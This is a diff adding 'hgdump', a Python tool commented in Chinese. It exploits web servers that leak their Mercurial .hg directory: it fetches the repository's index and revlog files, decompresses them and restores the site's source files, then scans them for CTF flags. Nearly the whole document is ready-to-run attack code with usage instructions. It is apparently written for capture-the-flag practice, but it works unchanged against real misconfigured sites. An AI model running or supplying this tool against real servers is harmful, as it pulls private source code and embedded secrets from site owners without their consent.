@@ -1,0 +1,263 @@
+#!/usr/bin/env python3
+# hgdump -- .hg(Mercurial) 泄露自动利用工具（零依赖 stdlib）
+# 用法: hgdump <URL> [--out 目录] [--list] [--cat 文件名]
+# 功能: 读取 .hg 固定结构 → fncache 动态清单 → revlog 解压 → 还原文件 + 自动 cat flag
+# 仓库: /home/a/hackingtools/web/信息泄露/hgdump
+
+import sys, os, zlib, struct
+import urllib.request, urllib.error
+
+# revlog v1 索引项（64B，大端）：
+#   0:6   offset(48bit)
+#   6:8   flags
+#   8:12  zlen(压缩后长度)
+#   12:16 ulen(解压后长度)
+#   16:20 base
+#   20:24 link
+#   24:28 p1
+#   28:32 p2
+#   32:52 node(20B)
+#   52:64 padding
+#
+# inline 时每项索引后紧跟 zlib 压缩数据
+# 非 inline 时数据集中在索引区之后，用 offset 字段定位
+
+if __name__ == '__main__':
+    url = None
+    out = None
+    list_only = False
+    cat_path = None
+    args = sys.argv[1:]
+
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a == '--out' and i + 1 < len(args):
+            out = args[i + 1]; i += 2
+        elif a == '--list':
+            list_only = True; i += 1
+        elif a == '--cat' and i + 1 < len(args):
+            cat_path = args[i + 1]; i += 2
+        elif a in ('-h', '--help'):
+            print('''hgdump -- .hg(Mercurial) 泄露自动利用
+
+用法:
+  hgdump <URL>                 枚举+还原文件+自动 cat flag
+  hgdump <URL> --out 目录      指定输出目录（默认 hgdump_<host>/）
+  hgdump <URL> --list          只列出固定结构探测结果
+  hgdump <URL> --cat 文件名    还原后 cat 指定文件
+
+示例:
+  hgdump http://目标
+  hgdump http://目标 --list
+  hgdump http://目标 --cat flag_xxx.txt''')
+            sys.exit(0)
+        else:
+            if not url:
+                url = a; i += 1
+            else:
+                print(f'[!] 未知选项: {a}', file=sys.stderr); sys.exit(1)
+
+    if not url:
+        print('用法: hgdump <URL> [--out 目录] [--list] [--cat 文件名]', file=sys.stderr)
+        sys.exit(1)
+
+    url = url.rstrip('/')
+    if not url.endswith('.hg'):
+        url += '/.hg'
+    url += '/'
+
+    if out is None:
+        host = url.split('://', 1)[-1].replace('/', '_').replace(':', '_')
+        out = f'hgdump_{host}'
+
+    # ---------- HTTP ----------
+
+    def get(path):
+        req = urllib.request.Request(url + path, headers={'User-Agent': 'hgdump/1.0'})
+        try:
+            with urllib.request.urlopen(req, timeout=10) as r:
+                return r.read()
+        except Exception:
+            return None
+
+    # ---------- revlog 解析 ----------
+
+    def load_revlog(data):
+        """解析 revlog v1，返回 [(node_hex, base_rev, full_text_or_None)]"""
+        if not data or len(data) < 64:
+            return []
+
+        # 检测 inline：第一项索引后是否紧跟 zlib magic
+        z0 = int.from_bytes(data[8:12], 'big')
+        if z0 > 0 and len(data) > 64 and data[64:65] == b'\x78':
+            inline = True
+        else:
+            inline = False
+
+        revs = []
+        pos = 0
+        i = 0
+
+        while pos + 64 <= len(data):
+            e = data[pos:pos + 64]
+            zlen = int.from_bytes(e[8:12], 'big')
+            base = int.from_bytes(e[16:20], 'big')
+            node = e[32:52].hex()
+
+            if zlen == 0:
+                revs.append((node, base, None))
+                if not inline:
+                    pos += 64
+                else:
+                    pos += 64
+                i += 1
+                continue
+
+            if inline:
+                chunk = data[pos + 64: pos + 64 + zlen]
+                pos += 64 + zlen
+            else:
+                off = int.from_bytes(e[0:6], 'big')
+                chunk = data[off: off + zlen]
+                pos += 64
+
+            try:
+                text = zlib.decompress(chunk)
+            except Exception:
+                text = None
+
+            is_full = (base == i) or (base == i and i == 0)
+            revs.append((node, base, text if is_full else None))
+            i += 1
+
+        return revs
+
+    # ---------- dotencode 还原 ----------
+
+    def decode_store_name(name):
+        """data/flag_xxx.txt.i → 还原文件名 flag_xxx.txt"""
+        s = name
+        if s.startswith('data/'):
+            s = s[5:]
+        # 去后缀 .i / .d / .df
+        if s.endswith('.i'):
+            s = s[:-2]
+        elif s.endswith('.d'):
+            s = s[:-2]
+        elif s.endswith('.df'):
+            s = s[:-3]
+        # dotencode 还原：_→. (仅首字符)
+        if s.startswith('_'):
+            s = '.' + s[1:]
+        return s
+
+    # ---------- ① 固定结构探测 ----------
+
+    print(f'[*] 目标: {url}')
+    seed = [
+        '/requires',
+        '/dirstate',
+        '/store/fncache',
+        '/store/00changelog.i',
+        '/store/00manifest.i',
+    ]
+
+    fncache = None
+    results = {}
+
+    for path in seed:
+        data = get(path)
+        status = 200 if data else 404
+        size = len(data) if data else 0
+        print(f'    [{status}] {path} ({size} B)')
+        results[path] = (status, data)
+        if path == '/store/fncache' and data and status == 200:
+            fncache = data.decode('utf-8', errors='replace').strip()
+
+    # ---------- ② 动态清单 ----------
+
+    if not fncache:
+        print('[!] fncache 未获取（404/网络错误），无法枚举文件')
+        if list_only:
+            sys.exit(0)
+        sys.exit(1)
+
+    store_files = [l for l in fncache.splitlines() if l.strip()]
+    print(f'[*] fncache 文件数: {len(store_files)}')
+    for f in store_files:
+        print(f'    {f}')
+
+    if list_only:
+        sys.exit(0)
+
+    # ---------- ③+④ 下载 + revlog 解压 ----------
+
+    os.makedirs(out, exist_ok=True)
+    restored = {}
+
+    for store_path in store_files:
+        store_path = store_path.strip()
+        if not store_path.startswith('data/'):
+            continue
+
+        # 尝试 .i，失败试 .d
+        raw = get(f'/store/{store_path}')
+        if raw is None and store_path.endswith('.i'):
+            alt = store_path[:-1] + 'd'
+            raw = get(f'/store/{alt}')
+            if raw:
+                store_path = alt
+
+        if raw is None:
+            print(f'    [404] {store_path}')
+            continue
+
+        revs = load_revlog(raw)
+        # 取最新有内容的 full-text 版本；fallback 取任意非 None
+        content = None
+        for node, base, text in reversed(revs):
+            if text is not None:
+                content = text
+                break
+
+        fname = decode_store_name(store_path)
+        out_path = os.path.join(out, fname)
+        os.makedirs(os.path.dirname(out_path) or out, exist_ok=True)
+        with open(out_path, 'wb') as f:
+            f.write(content or b'')
+        restored[fname] = content
+        print(f'    [+] {store_path} → {fname} ({len(content or b"")} B)')
+
+    # ---------- ⑥ 扫描 flag ----------
+
+    print(f'\n[+] 还原文件: {len(restored)} 个 → {out}/')
+
+    # cat 模式
+    if cat_path:
+        if cat_path in restored:
+            content = restored[cat_path]
+            if content:
+                print(f'\n--- {cat_path} ---')
+                print(content.decode('utf-8', errors='replace').strip())
+            else:
+                print(f'[!] {cat_path} 无内容')
+        else:
+            print(f'[!] 未找到 {cat_path}')
+        sys.exit(0)
+
+    # 自动扫描 flag
+    print('\n[+] 扫描结果:')
+    flag_found = False
+    for fname, content in sorted(restored.items()):
+        if not content:
+            continue
+        s = content.decode('utf-8', errors='replace').strip()
+        lines = [l for l in s.splitlines() if 'flag' in l.lower() or 'ctfhub{' in l]
+        if lines:
+            print(f'    {fname}:')
+            for l in lines:
+                print(f'        {l}')
+            flag_found = True
+    if not flag_found:
+        print('    (未自动发现 flag，请手动检查还原文件)')
